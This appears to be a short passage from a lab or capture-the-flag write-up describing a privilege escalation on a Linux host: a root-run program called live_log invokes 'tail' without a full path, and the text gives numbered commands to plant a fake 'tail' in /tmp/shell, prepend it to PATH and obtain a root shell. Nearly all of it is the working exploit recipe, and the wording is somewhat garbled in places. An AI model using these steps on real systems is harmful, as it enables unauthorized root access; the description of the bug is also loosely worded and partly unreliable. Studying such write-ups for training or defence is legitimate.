This lane tail -f /var/log/nginx/accessl.logshows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

    How to exploit it?
    1. Create a new directory in /tmp/ folder example :
    mkdir /tmp/shell
    2. Go into that folder :
    cd /tmp/shell
    3. Change the /usr/bin folder to /tmp/shell
    export PATH=/tmp/shell:$PATH
    4. Create a tail file, enter these two commands:
    echo ‘#!/bin/bash’ > tail
    echo ‘/bin/bash’ >> tail
    5. Change the permissions for the tail file
    chmod +x tail
    6. Go back to live_log and run the file
    ./live_log
